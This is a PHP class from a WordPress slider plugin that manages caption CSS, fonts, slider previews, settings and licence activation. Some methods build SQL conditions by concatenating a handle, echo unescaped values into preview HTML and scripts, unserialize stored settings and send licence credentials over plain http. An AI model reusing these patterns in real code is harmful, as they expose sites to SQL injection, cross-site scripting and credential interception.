				'"Comic Sans MS", cursive, sans-serif',
				'Impact, Charcoal, sans-serif',
				'"Lucida Sans Unicode", "Lucida Grande", sans-serif',
				'Tahoma, Geneva, sans-serif',
				'"Trebuchet MS", Helvetica, sans-serif',
				'Verdana, Geneva, sans-serif',

				//Monospace Fonts
				'"Courier New", Courier, monospace',
				'"Lucida Console", Monaco, monospace'
			);

			if($slider->getParam("load_googlefont","false") == "true"){
				$font_custom = $slider->getParam("google_font","");
				if(!is_array($font_custom)) $font_custom = array($font_custom); //backwards compability

				if(is_array($font_custom)){
					foreach($font_custom as $key => $curFont){
						$font = $this->cleanFontStyle(stripslashes($curFont));
						if($font != false)
							$font_custom[$key] = $font;
						else
							unset($font_custom[$key]);
					}
					$fonts = array_merge($font_custom, $fonts);
				}
			}

			//add punch fonts here
			$pfonts = new ThemePunch_Fonts();
			$rpfonts = $pfonts->get_all_fonts();
			$punchfonts = array();

			if(!empty($rpfonts)){
				foreach($rpfonts as $rfont){
					$cfont = explode('+', $rfont['url']);
					$cfont = implode(' ', $cfont);
					$cfont = explode(':', $cfont);
					$punchfonts[] = '"'.$cfont[0].'"';
				}
				$fonts = array_merge($punchfonts, $fonts);
			}

			return $fonts;
		}


		/**
		 *
		 * get font name in clean
		 */
		public function cleanFontStyle($font){
			$url = preg_match('/href=["\']?([^"\'>]+)["\']?/', $font, $match);
			if(!isset($match[1])) return false;
			$info = parse_url($match[1]);

			if(isset($info['query'])){
				$font = str_replace(array('family=', '+'), array('', ' '), $info['query']);
				$font = explode(':', $font);
				return (strpos($font['0'], ' ') !== false) ? '"'.$font['0'].'"' : $font['0'];

			}

			return false;
		}

		/**
		 *
		 * get the select classes html for putting in the html by ajax
		 */
		private function getHtmlSelectCaptionClasses($contentCSS){
			$arrCaptions = $this->getArrCaptionClasses($contentCSS);
			$htmlSelect = UniteFunctionsRev::getHTMLSelect($arrCaptions,"","id='layer_caption' name='layer_caption'",true);
			return($htmlSelect);
		}

		/**
		 *
		 * get contents of the css table
		 */
		public function getCaptionsContent(){
			$result = $this->db->fetch(GlobalsRevSlider::$table_css);
			$contentCSS = UniteCssParserRev::parseDbArrayToCss($result);
			return($contentCSS);
		}


		/**
		 *
		 * get contents of the css table
		 */
		public static function getCaptionsContentArray($handle = false){
			$db = new UniteDBRev();
			$result = $db->fetch(GlobalsRevSlider::$table_css);
			$contentCSS = UniteCssParserRev::parseDbArrayToArray($result, $handle);
			return($contentCSS);
		}

		/**
		 *
		 * get contents of the static css file
		 */
		public static function getStaticCss(){
			if ( is_multisite() ){
				if(!get_site_option('revslider-static-css')){
					$contentCSS = @file_get_contents(GlobalsRevSlider::$filepath_static_captions);
					self::updateStaticCss($contentCSS);
				}
				$contentCSS = get_site_option('revslider-static-css', '');
			}else{
				if(!get_option('revslider-static-css')){
					$contentCSS = @file_get_contents(GlobalsRevSlider::$filepath_static_captions);
					self::updateStaticCss($contentCSS);
				}
				$contentCSS = get_option('revslider-static-css', '');
			}

			return($contentCSS);
		}

		/**
		 *
		 * get contents of the static css file
		 */
		public static function updateStaticCss($content){
			$content = str_replace(array("\'", '\"', '\\\\'),array("'", '"', '\\'), trim($content));

			if ( is_multisite() ){
				$c = get_site_option('revslider-static-css', '');
				$c = update_site_option('revslider-static-css', $content);
			}else{
				$c = get_option('revslider-static-css', '');
				$c = update_option('revslider-static-css', $content);
			}

			//UniteFunctionsRev::writeFile($content, GlobalsRevSlider::$filepath_static_captions);
			//$static = self::getStaticCss();

			return $content;
		}

		/**
		 *
		 * get contents of the static css file
		 */
		public function getDynamicCss(){
			$db = new UniteDBRev();

			$styles = $db->fetch(GlobalsRevSlider::$table_css);
			$styles = UniteCssParserRev::parseDbArrayToCss($styles, "\n");
			//$contentCSS = file_get_contents(GlobalsRevSlider::$filepath_dynamic_captions);
			//return($contentCSS);
			return $styles;
		}

		/**
		 *
		 * insert captions css file content
		 * @return new captions html select
		 */
		public function insertCaptionsContentData($content){
			if(isset($content['handle'])) {
				$db = new UniteDBRev();

				$handle = $content['handle'];

				$arrInsert = array();
				$arrInsert["handle"] = '.tp-caption.'.$handle;
				$arrInsert["params"] = stripslashes(json_encode(str_replace("'", '"', $content['params'])));
				$arrInsert["hover"] = stripslashes(json_encode(str_replace("'", '"', @$content['hover'])));
				$arrInsert["settings"] = stripslashes(json_encode(str_replace("'", '"', @$content['settings'])));

				$result = $db->insert(GlobalsRevSlider::$table_css, $arrInsert);
			}

			//$this->updateDynamicCaptions();

			//output captions array
			$operations = new RevOperations();
			$cssContent = $operations->getCaptionsContent();
			$arrCaptions = $operations->getArrCaptionClasses($cssContent);
			return($arrCaptions);
		}

		/**
		 *
		 * update captions css file content
		 * @return new captions html select
		 */
		public function updateCaptionsContentData($content){
			if(isset($content['handle'])) {
				$db = new UniteDBRev();

				$handle = $content['handle'];

				$arrUpdate = array();
				$arrUpdate["params"] = stripslashes(json_encode(str_replace("'", '"', $content['params'])));
				$arrUpdate["hover"] = stripslashes(json_encode(str_replace("'", '"', @$content['hover'])));
				$arrUpdate["settings"] = stripslashes(json_encode(str_replace("'", '"', @$content['settings'])));
				$result = $db->update(GlobalsRevSlider::$table_css, $arrUpdate, array('handle' => '.tp-caption.'.$handle));
			}

			//$this->updateDynamicCaptions();

			//output captions array
			$operations = new RevOperations();
			$cssContent = $operations->getCaptionsContent();
			$arrCaptions = $operations->getArrCaptionClasses($cssContent);
			return($arrCaptions);
		}

		/**
		 *
		 * delete captions css file content
		 * @return new captions html select
		 */
		public function deleteCaptionsContentData($handle){
			$db = new UniteDBRev();

			$db->delete(GlobalsRevSlider::$table_css,"handle='.tp-caption.".$handle."'");

			//$this->updateDynamicCaptions();

			//output captions array
			$operations = new RevOperations();
			$cssContent = $operations->getCaptionsContent();
			$arrCaptions = $operations->getArrCaptionClasses($cssContent);
			return($arrCaptions);
		}

		/**
		 *
		 * update dynamic-captions css file content
		 */
		public static function updateDynamicCaptions($full = false){
			if($full){
				$captions = array();
				$captions = RevOperations::getCaptionsContentArray();

				$styles = UniteCssParserRev::parseArrayToCss($captions, "\n");
				//write styles into dynamic css
				//UniteFunctionsRev::writeFile($styles, GlobalsRevSlider::$filepath_dynamic_captions);
			}else{
				//go through all sliders and check which classes are used, get all classes from DB and write them into the file
				$slider = new RevSlider();
				$arrSliders = $slider->getArrSliders();

				$classes = array();

				//get used classes
				if(!empty($arrSliders)){
					foreach($arrSliders as $slider){
						try{
							$slides = $slider->getSlides();

							if(!empty($slides)){
								foreach($slides as $slide){
									$layers = $slide->getLayers();
									if(!empty($layers)){
										foreach($layers as $layer){
											if(isset($layer['style'])){
												if(!empty($layer['style'])) $classes[$layer['style']] = true;
											}
										}
									}
								}
							}

						}catch(Exception $e){
							$errorMessage = "ERROR: ".$e->getMessage();
						}
					}
				}

				if(!empty($classes)){
					$captions = array();
					foreach($classes as $class => $val){
						$captionCheck = RevOperations::getCaptionsContentArray($class);
						if(!empty($captionCheck)) $captions[] = $captionCheck;
					}

					$styles = UniteCssParserRev::parseArrayToCss($captions, "\n");

					//write styles into dynamic css
					//UniteFunctionsRev::writeFile($styles, GlobalsRevSlider::$filepath_dynamic_captions);
				}
			}
		}


		/**
		 *
		 * get contents of the css file
		 */
		public static function getCaptionsCssContentArray(){
			if(file_exists(GlobalsRevSlider::$filepath_captions))
				$contentCSS = file_get_contents(GlobalsRevSlider::$filepath_captions);
			else if(file_exists(GlobalsRevSlider::$filepath_captions_original))
				$contentCSS = file_get_contents(GlobalsRevSlider::$filepath_captions_original);
			else if(file_exists(GlobalsRevSlider::$filepath_backup.'captions.css'))
				$contentCSS = file_get_contents(GlobalsRevSlider::$filepath_backup.'captions.css');
			else if(file_exists(GlobalsRevSlider::$filepath_backup.'captions-original.css'))
				$contentCSS = file_get_contents(GlobalsRevSlider::$filepath_backup.'captions-original.css');
			else
				UniteFunctionsRev::throwError("No captions.css found! This installation is incorrect, please make sure to reupload the Slider Revolution plugin and try again!");

			$result = UniteCssParserRev::parseCssToArray($contentCSS);

			return($result);
		}

		/**
		 *
		 * import contents of the css file
		 */
		public static function importCaptionsCssContentArray(){
			$db = new UniteDBRev();
			$css = self::getCaptionsCssContentArray();
			$static = array();
			if(is_array($css) && $css !== false && count($css) > 0){
				foreach($css as $class => $styles){
					//check if static style or dynamic style
					$class = trim($class);

					if((strpos($class, ':hover') === false && strpos($class, ':') !== false) || //before, after
					    strpos($class," ") !== false || // .tp-caption.imageclass img or .tp-caption .imageclass or .tp-caption.imageclass .img
					    strpos($class,".tp-caption") === false || // everything that is not tp-caption
						(strpos($class,".") === false || strpos($class,"#") !== false) || // no class -> #ID or img
					    strpos($class,">") !== false){ //.tp-caption>.imageclass or .tp-caption.imageclass>img or .tp-caption.imageclass .img

						$static[$class] = $styles;
						continue;
					}

					//is a dynamic style
					if(strpos($class, ':hover') !== false){
						$class = trim(str_replace(':hover', '', $class));
						$arrInsert = array();
						$arrInsert["hover"] = json_encode($styles);
						$arrInsert["settings"] = json_encode(array('hover' => 'true'));
					}else{
						$arrInsert = array();
						$arrInsert["params"] = json_encode($styles);
					}
					//check if class exists
					$result = $db->fetch(GlobalsRevSlider::$table_css, "handle = '".$class."'");

					if(!empty($result)){ //update
						$db->update(GlobalsRevSlider::$table_css, $arrInsert, array('handle' => $class));
					}else{ //insert
						$arrInsert["handle"] = $class;
						$db->insert(GlobalsRevSlider::$table_css, $arrInsert);
					}
				}
			}

			if(!empty($static)){ //save static into static-captions.css
				$css = UniteCssParserRev::parseStaticArrayToCss($static);
				$static_cur = RevOperations::getStaticCss(); //get the open sans line!
				$css = $static_cur."\n".$css;

				self::updateStaticCss($css);
			}
		}

		/**
		 *
		 * move old captions.css and captions-original.css
		 */
		public static function moveOldCaptionsCss(){
			if(file_exists(GlobalsRevSlider::$filepath_captions_original))
				$success = @rename(GlobalsRevSlider::$filepath_captions_original, GlobalsRevSlider::$filepath_backup.'/captions-original.css');

			if(file_exists(GlobalsRevSlider::$filepath_captions))
				$success = @rename(GlobalsRevSlider::$filepath_captions, GlobalsRevSlider::$filepath_backup.'/captions.css');
		}

		/**
		 *
		 * preview slider output
		 * if output object is null - create object
		 */
		public function previewOutput($sliderID,$output = null){

			if($sliderID == "empty_output"){
				$this->loadingMessageOutput();
				exit();
			}

			if($output == null)
				$output = new RevSliderOutput();

			$slider = new RevSlider();
			$slider->initByID($sliderID);
			$isWpmlExists = UniteWpmlRev::isWpmlExists();
			$useWpml = $slider->getParam("use_wpml","off");
			$wpmlActive = false;
			if($isWpmlExists && $useWpml == "on"){
				$wpmlActive = true;
				$arrLanguages = UniteWpmlRev::getArrLanguages(false);

				//set current lang to output
				$currentLang = UniteFunctionsRev::getPostGetVariable("lang");

				if(empty($currentLang))
					$currentLang = UniteWpmlRev::getCurrentLang();

				if(empty($currentLang))
					$currentLang = $arrLanguages[0];

				$output->setLang($currentLang);

				$selectLangChoose = UniteFunctionsRev::getHTMLSelect($arrLanguages,$currentLang,"id='select_langs'",true);
			}


			$output->setPreviewMode();

			//put the output html
			$urlPlugin = RevSliderAdmin::$url_plugin."rs-plugin/";
			$urlPreviewPattern = UniteBaseClassRev::$url_ajax_actions."&client_action=preview_slider&sliderid=".$sliderID."&lang=[lang]&nonce=[nonce]";
			$nonce = wp_create_nonce("revslider_actions");

			$setBase = (is_ssl()) ? "https://" : "http://";

			$f = new ThemePunch_Fonts();
			$my_fonts = $f->get_all_fonts();
			?>
				<html>
					<head>
						<link rel='stylesheet' href='<?php echo $urlPlugin?>css/settings.css?rev=<?php echo GlobalsRevSlider::SLIDER_REVISION; ?>' type='text/css' media='all' />
						<?php
						$db = new UniteDBRev();

						$styles = $db->fetch(GlobalsRevSlider::$table_css);
						$styles = UniteCssParserRev::parseDbArrayToCss($styles, "\n");
						$styles = UniteCssParserRev::compress_css($styles);

						echo '<style type="text/css">'.$styles.'</style>'; //.$stylesinnerlayers

						$http = (is_ssl()) ? 'https' : 'http';

						if(!empty($my_fonts)){
							foreach($my_fonts as $c_font){
								?>
								<link rel='stylesheet' href="<?php echo $http.'://fonts.googleapis.com/css?family='.strip_tags($c_font['url']); ?>" type='text/css' />
								<?php
							}
						}

						$custom_css = RevOperations::getStaticCss();
						echo '<style type="text/css">'.UniteCssParserRev::compress_css($custom_css).'</style>';
						?>

						<script type='text/javascript' src='<?php echo $setBase; ?>ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js'></script>

						<script type='text/javascript' src='<?php echo $urlPlugin?>js/jquery.themepunch.tools.min.js?rev=<?php echo GlobalsRevSlider::SLIDER_REVISION; ?>'></script>
						<script type='text/javascript' src='<?php echo $urlPlugin?>js/jquery.themepunch.revolution.min.js?rev=<?php echo GlobalsRevSlider::SLIDER_REVISION; ?>'></script>
					</head>
					<body style="padding:0px;margin:0px;">
						<?php if($wpmlActive == true):?>
							<div style="margin-bottom:10px;text-align:center;">
							<?php _e("Choose language",REVSLIDER_TEXTDOMAIN)?>: <?php echo $selectLangChoose?>
							</div>

							<script type="text/javascript">
								var g_previewPattern = '<?php echo $urlPreviewPattern?>';
								jQuery("#select_langs").change(function(){
									var lang = this.value;
									var nonce = "<?php echo $nonce; ?>";
									var pattern = g_previewPattern;
									var urlPreview = pattern.replace("[lang]",lang).replace("[nonce]",nonce);
									location.href = urlPreview;
								});
							</script>
						<?php endif?>

						<?php
							$output->putSliderBase($sliderID);
						?>
					</body>
				</html>
			<?php
			exit();
		}

		/*
		 * show only the markup for jQuery version of plugin
		 */
		public function previewOutputMarkup($sliderID,$output = null){

			if($sliderID == "empty_output"){
				$this->loadingMessageOutput();
				exit();
			}

			if($output == null)
				$output = new RevSliderOutput();

			$slider = new RevSlider();
			$slider->initByID($sliderID);
			$isWpmlExists = UniteWpmlRev::isWpmlExists();
			$useWpml = $slider->getParam("use_wpml","off");
			$wpmlActive = false;
			if($isWpmlExists && $useWpml == "on"){
				$wpmlActive = true;
				$arrLanguages = UniteWpmlRev::getArrLanguages(false);

				//set current lang to output
				$currentLang = UniteFunctionsRev::getPostGetVariable("lang");

				if(empty($currentLang))
					$currentLang = UniteWpmlRev::getCurrentLang();

				if(empty($currentLang))
					$currentLang = $arrLanguages[0];

				$output->setLang($currentLang);

				$selectLangChoose = UniteFunctionsRev::getHTMLSelect($arrLanguages,$currentLang,"id='select_langs'",true);
			}


			$output->setPreviewMode();

			//put the output html
			$urlPlugin = "http://yourpluginpath/";
			$urlPreviewPattern = UniteBaseClassRev::$url_ajax_actions."&client_action=preview_slider&only_markup=true&sliderid=".$sliderID."&lang=[lang]&nonce=[nonce]";
			$nonce = wp_create_nonce("revslider_actions");

			$setBase = (is_ssl()) ? "https://" : "http://";

			$f = new ThemePunch_Fonts();
			$my_fonts = $f->get_all_fonts();


			?>
			<html>
			<head>
				<script type='text/javascript' src='<?php echo $setBase; ?>ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js'></script>
			</head>
			<body style="padding:0px;margin:0px;">
				<?php if($wpmlActive == true):?>
					<div style="margin-bottom:10px;text-align:center;">
					<?php _e("Choose language",REVSLIDER_TEXTDOMAIN)?>: <?php echo $selectLangChoose?>
					</div>

					<script type="text/javascript">
						var g_previewPattern = '<?php echo $urlPreviewPattern?>';
						jQuery("#select_langs").change(function(){
							var lang = this.value;
							var nonce = "<?php echo $nonce; ?>";
							var pattern = g_previewPattern;
							var urlPreview = pattern.replace("[lang]",lang).replace("[nonce]",nonce);
							location.href = urlPreview;
						});

						jQuery('body').on('click', '#rev_replace_images', function(){
							var from = jQuery('input[name="orig_image_path"]').val();
							var to = jQuery('input[name="replace_image_path"]').val();

							jQuery('#rev_script_content').val(jQuery('#rev_script_content').val().replace(from, to));
							jQuery('#rev_the_content').val(jQuery('#rev_the_content').val().replace(from, to));
							jQuery('#rev_style_content').val(jQuery('#rev_style_content').val().replace(from, to));
							jQuery('#rev_head_content').val(jQuery('#rev_head_content').val().replace(from, to));
						});

					</script>
				<?php endif?>
			<?php
			//UniteBaseClassRev::$url_plugin

			ob_start();
			?><link rel='stylesheet' href='<?php echo $urlPlugin?>css/settings.css?rev=<?php echo GlobalsRevSlider::SLIDER_REVISION; ?>' type='text/css' media='all' />
<?php
		$http = (is_ssl()) ? 'https' : 'http';

		if(!empty($my_fonts)){
			foreach($my_fonts as $c_font){
				?><link rel='stylesheet' href="<?php echo $http.'://fonts.googleapis.com/css?family='.strip_tags($c_font['url']); ?>" type='text/css' /><?php
				echo "\n";
			}
		}
		?>
<script type='text/javascript' src='<?php echo $urlPlugin?>js/jquery.themepunch.tools.min.js?rev=<?php echo GlobalsRevSlider::SLIDER_REVISION; ?>'></script>
<script type='text/javascript' src='<?php echo $urlPlugin?>js/jquery.themepunch.revolution.min.js?rev=<?php echo GlobalsRevSlider::SLIDER_REVISION; ?>'></script>
<?php
			$head_content = ob_get_contents();
			ob_clean();
			ob_end_clean();

			ob_start();

			$custom_css = RevOperations::getStaticCss();
			echo $custom_css."\n\n";

			echo '/*****************'."\n";
			echo ' ** '.__('CAPTIONS CSS', REVSLIDER_TEXTDOMAIN)."\n";
			echo ' ****************/'."\n\n";
			$db = new UniteDBRev();
			$styles = $db->fetch(GlobalsRevSlider::$table_css);
			echo UniteCssParserRev::parseDbArrayToCss($styles, "\n");

			$style_content = ob_get_contents();
			ob_clean();
			ob_end_clean();

			ob_start();

			$output->putSliderBase($sliderID);

			$content = ob_get_contents();
			ob_clean();
			ob_end_clean();

			$script_content = substr($content, strpos($content, '<script type="text/javascript">'), strpos($content, '</script>') + 9 - strpos($content, '<script type="text/javascript">'));
			$content = htmlentities(str_replace($script_content, '', $content));
			$script_content = str_replace('				', '', $script_content);
			$script_content = str_replace(array('<script type="text/javascript">', '</script>'), '', $script_content);

			?>
			<style>
				body 	 { font-family:sans-serif; font-size:12px;}
				textarea { background:#f1f1f1; border:#ddd; font-size:10px; line-height:16px; margin-bottom:40px; padding:10px;}
				.rev_cont_title { color:#000; text-decoration:none;font-size:14px; line-height:24px; font-weight:800;background: #D5D5D5;padding: 10px;}
				.rev_cont_title a,
				.rev_cont_title a:visited { margin-left:25px;font-size:12px;line-height:12px;float:right;background-color:#8e44ad; color:#fff; padding:8px 10px;text-decoration:none;}
				.rev_cont_title a:hover	  { background-color:#9b59b6}
			</style>
			<p><?php $dir = wp_upload_dir(); ?>
				<?php _e('Replace image path:', REVSLIDER_TEXTDOMAIN); ?> <?php _e('From:', REVSLIDER_TEXTDOMAIN); ?> <input type="text" name="orig_image_path" value="<?php echo @$dir['baseurl']; ?>" /> <?php _e('To:', REVSLIDER_TEXTDOMAIN); ?> <input type="text" name="replace_image_path" value="" /> <input id="rev_replace_images" type="button" name="replace_images" value="<?php _e('Replace', REVSLIDER_TEXTDOMAIN); ?>" />
			</p>

			<div class="rev_cont_title"><?php _e('Header', REVSLIDER_TEXTDOMAIN); ?> <a class="button-primary revpurple export_slider_standalone copytoclip" data-idt="rev_head_content"  href="javascript:void(0);" original-title=""><?php _e('Mark to Copy', REVSLIDER_TEXTDOMAIN); ?></a><div style="clear:both"></div></div>
			<textarea id="rev_head_content" readonly="true" style="width: 100%; height: 100px; color:#3498db"><?php echo $head_content; ?></textarea>
			<div class="rev_cont_title"><?php _e('CSS', REVSLIDER_TEXTDOMAIN); ?><a class="button-primary revpurple export_slider_standalone copytoclip" data-idt="rev_style_content"  href="javascript:void(0);" original-title=""><?php _e('Mark to Copy', REVSLIDER_TEXTDOMAIN); ?></a></div>
			<textarea id="rev_style_content" readonly="true" style="width: 100%; height: 100px;"><?php echo $style_content; ?></textarea>
			<div class="rev_cont_title"><?php _e('Body', REVSLIDER_TEXTDOMAIN); ?><a class="button-primary revpurple export_slider_standalone copytoclip" data-idt="rev_the_content"  href="javascript:void(0);" original-title=""><?php _e('Mark to Copy', REVSLIDER_TEXTDOMAIN); ?></a></div>
			<textarea id="rev_the_content" readonly="true" style="width: 100%; height: 100px;"><?php echo $content; ?></textarea>
			<div class="rev_cont_title"><?php _e('Script', REVSLIDER_TEXTDOMAIN); ?><a class="button-primary revpurple export_slider_standalone copytoclip" data-idt="rev_script_content"  href="javascript:void(0);" original-title=""><?php _e('Mark to Copy', REVSLIDER_TEXTDOMAIN); ?></a></div>
			<textarea id="rev_script_content" readonly="true" style="width: 100%; height: 100px;"><?php echo $script_content; ?></textarea>

			<script>
				jQuery('body').on('click','.copytoclip',function() {
					jQuery("#"+jQuery(this).data('idt')).select();
				});
			</script>
			</body>
			</html>
			<?php
			exit();
		}

		/**
		 *
		 * output loading message
		 */
		public function loadingMessageOutput(){
			?>
			<div class="message_loading_preview"><?php _e("Loading Preview...",REVSLIDER_TEXTDOMAIN)?></div>
			<?php
		}

		/**
		 *
		 * put slide preview by data
		 */
		public function putSlidePreviewByData($data){

			if($data == "empty_output"){
				$this->loadingMessageOutput();
				exit();
			}

			$data = UniteFunctionsRev::jsonDecodeFromClientSide($data);

			$slideID = $data["slideid"];
			$slide = new RevSlide();
			$slide->initByID($slideID);
			$sliderID = $slide->getSliderID();

			$output = new RevSliderOutput();
			$output->setOneSlideMode($data);

			$this->previewOutput($sliderID,$output);
		}


		/**
		 * update general settings
		 */
		public function updateGeneralSettings($data){

			$strSettings = serialize($data);
			$params = new RevSliderParams();
			$params->updateFieldInDB("general", $strSettings);
		}


		/**
		 *
		 * get general settigns values.
		 */
		static function getGeneralSettingsValues(){

			$params = new RevSliderParams();
			$strSettings = $params->getFieldFromDB("general");

			$arrValues = array();
			if(!empty($strSettings))
				$arrValues = unserialize($strSettings);

			return($arrValues);
		}

		/**
		* update language filter in session
		 */
		public function updateLangFilter($data){
			$lang = UniteFunctionsRev::getVal($data, "lang");
			$sliderID = UniteFunctionsRev::getVal($data, "sliderid");

			if(!isset($_SESSION))
				return(false);
			$_SESSION["revslider_lang_filter"] = $lang;
			return($sliderID);
		}

		/**
		 *
		 * get lang filter value from session
		 */
		public function getLangFilterValue(){

			if(!isset($_SESSION))
				return("all");

			$langFitler = UniteFunctionsRev::getVal($_SESSION, "revslider_lang_filter","all");

			return($langFitler);
		}


		/**
		 *
		 * modify custom slider params. This is instead custom settings difficulties.
		 */
		public function modifyCustomSliderParams($data){

			$settigns = new UniteSettingsRev();

			$arrNames = array("width","height",
							  "responsitive_w1","responsitive_sw1",
							  "responsitive_w2","responsitive_sw2",
							  "responsitive_w3","responsitive_sw3",
							  "responsitive_w4","responsitive_sw4",
							  "responsitive_w5","responsitive_sw5",
							  "responsitive_w6","responsitive_sw6");

			$arrMain = $data["main"];
			foreach($arrNames as $name){
				if(array_key_exists($name, $arrMain)){
					$arrMain[$name] = $settigns->modifyValueByDatatype($arrMain[$name], UniteSettingsRev::DATATYPE_NUMBER);
				}
			}

			$arrMain["fullscreen_offset_container"] = $settigns->modifyValueByDatatype($arrMain["fullscreen_offset_container"], UniteSettingsRev::DATATYPE_STRING);

			//$arrMain["auto_height"] = $settigns->modifyValueByDatatype($arrMain["auto_height"], UniteSettingsRev::DATATYPE_STRING);
			$data["main"] = $arrMain;

			return($data);
		}


		/**
		 *
		 * get post types with categories for client side.
		 */
		public static function getPostTypesWithCatsForClient(){
			$arrPostTypes = UniteFunctionsWPRev::getPostTypesWithCats();

			$globalCounter = 0;

			$arrOutput = array();
			foreach($arrPostTypes as $postType => $arrTaxWithCats){

				$arrCats = array();
				foreach($arrTaxWithCats as $tax){
					$taxName = $tax["name"];
					$taxTitle = $tax["title"];
					$globalCounter++;
					$arrCats["option_disabled_".$globalCounter] = "---- ".$taxTitle." ----";
					foreach($tax["cats"] as $catID=>$catTitle){
						$arrCats[$taxName."_".$catID] = $catTitle;
					}
				}//loop tax

				$arrOutput[$postType] = $arrCats;

			}//loop types

			return($arrOutput);
		}


		/**
		 *
		 * get html font import
		 */
		public static function getCleanFontImport($font){
			$setBase = (is_ssl()) ? "https://" : "http://";

			if(strpos($font, "href=") === false){ //fallback for old versions
				return '<link href="'.$setBase.'fonts.googleapis.com/css?family='.$font.'" rel="stylesheet" type="text/css" media="all" />'; //id="rev-google-font"
			}else{
				$font = str_replace(array('http://', 'https://'), array($setBase, $setBase), $font);
				return stripslashes($font);
			}
		}


		public function checkPurchaseVerification($data){
			global $wp_version;

			$response = wp_remote_post('http://updates.themepunch.com/activate.php', array(
				'user-agent' => 'WordPress/'.$wp_version.'; '.get_bloginfo('url'),
				'body' => array(
					'name' => urlencode($data['username']),
					'api' => urlencode($data['api_key']),
					'code' => urlencode($data['code']),
					'product' => urlencode('revslider')
				)
			));

			$response_code = wp_remote_retrieve_response_code( $response );
			$version_info = wp_remote_retrieve_body( $response );

			if ( $response_code != 200 || is_wp_error( $version_info ) ) {
				return false;
			}

			if($version_info == 'valid'){
				update_option('revslider-valid', 'true');
				update_option('revslider-api-key', $data['api_key']);
				update_option('revslider-username', $data['username']);
				update_option('revslider-code', $data['code']);

				return true;
			}elseif($version_info == 'exist'){
				UniteFunctionsRev::throwError(__('Purchase Code already registered!', REVSLIDER_TEXTDOMAIN));
			}else{
				return false;
			}

		}

		public function doPurchaseDeactivation($data){
			global $wp_version;

			$key = get_option('revslider-api-key', '');
			$name = get_option('revslider-username', '');
			$code = get_option('revslider-code', '');

			$response = wp_remote_post('http://updates.themepunch.com/deactivate.php', array(
				'user-agent' => 'WordPress/'.$wp_version.'; '.get_bloginfo('url'),
				'body' => array(
					'name' => urlencode($name),
					'api' => urlencode($key),
					'code' => urlencode($code),
					'product' => urlencode('revslider')
				)
			));

			$response_code = wp_remote_retrieve_response_code( $response );
			$version_info = wp_remote_retrieve_body( $response );

			if ( $response_code != 200 || is_wp_error( $version_info ) ) {
				return false;
			}

			if($version_info == 'valid'){
				//update_option('revslider-api-key', '');
				//update_option('revslider-username', '');
				//update_option('revslider-code', '');
				update_option('revslider-valid', 'false');

				return true;
			}else{
				return false;
			}

		}


	}

?>